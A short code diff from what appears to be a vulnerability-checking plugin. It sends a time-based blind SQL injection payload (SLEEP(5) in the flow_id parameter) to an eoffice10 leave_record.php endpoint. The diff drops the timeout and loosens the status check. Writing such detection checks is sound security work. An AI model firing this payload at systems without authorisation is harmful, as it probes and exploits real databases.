@@ -14,8 +14,8 @@ def verify(url):
     }
     vurl = urllib.parse.urljoin(url, "/eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%285%29%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10")
     try:
-        response = requests.get(vurl, headers=headers, timeout=8)
-        if response.status_code == 200 and response.elapsed.total_seconds() > 5:
+        response = requests.get(vurl, headers=headers)
+        if response.status_code not in range(400, 499) and response.elapsed.total_seconds() > 5:
             relsult['vulnerable'] = True
             relsult['verify'] = vurl
         return relsult
